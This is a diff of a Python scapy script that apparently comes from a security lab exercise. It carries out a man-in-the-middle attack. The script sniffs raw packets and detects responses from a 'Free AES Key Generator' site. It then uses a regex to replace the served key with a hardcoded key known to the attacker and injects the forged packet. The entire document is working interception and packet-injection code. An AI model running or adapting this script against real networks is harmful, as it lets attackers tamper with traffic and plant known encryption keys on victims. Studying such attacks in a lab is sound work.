@@ -1,6 +1,7 @@
 from scapy.all import send, conf, L3RawSocket
 from scapy.all import TCP, IP, Ether, Raw
 import socket
+import re
 
 # Use this function to send packets
 def inject_pkt(pkt):
@@ -8,19 +9,11 @@ def inject_pkt(pkt):
     send(pkt)
 
 # Known Key used in MIM attack
-modifiedKey = b"4d6167696320576f7264733a2053717565616d697368204f7373696672616765"
+knownKey = b"4d6167696320576f7264733a2053717565616d697368204f7373696672616765"
 
 # Resolve the target hostname to an IP address
 targetHost = "freeaeskey.xyz"
-
-try:
-    targetIP = socket.gethostbyname(targetHost)
-except socket.gaierror:
-    print(f"Failed to resolve {targetHost}")
-    targetIP = None
-
-# Use the resolved IP address as the target
-target = targetIP 
+targetIP = socket.gethostbyname(targetHost)
 
 
 def handle_pkt(pkt):
@@ -33,16 +26,30 @@ def handle_pkt(pkt):
 
         # Check if the packet contains a Raw layer with payload
         if Raw in ethPacket:
+            # Get the raw packet data
             data = ethPacket[Raw].load
 
+            # Sub-byte-string to look for
+            byteStr = b"Free AES Key Generator!"
+
             # Intercept the request and modify the response
-            if target and target.encode() in data:
-                modified_data = data.replace(target.encode(), modifiedKey)
-                new_packet = ethPacket
-                new_packet[Raw].load = modified_data
+            if byteStr in data:
+                # Use regex to replace the key with the known key
+                modResponse = re.sub(rb'<b>[0-9a-f]+</b>', b'<b>' + knownKey + b'</b>', data)
+
+                # Create a new packet to inject
+                MIMPacket = ethPacket.copy()
+
+                # Locate the Raw layer in the new_packet and set its load to the modified data
+                if Raw in MIMPacket:
+                    MIMPacket[Raw].load = modResponse
+                else:
+                    # If there is no Raw layer in the packet, create one and set its load
+                    MIMPacket = MIMPacket / Raw(load=modResponse)
 
                 # Send the modified response
-                inject_pkt(new_packet)
+                inject_pkt(MIMPacket)
+
 
 def main():
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
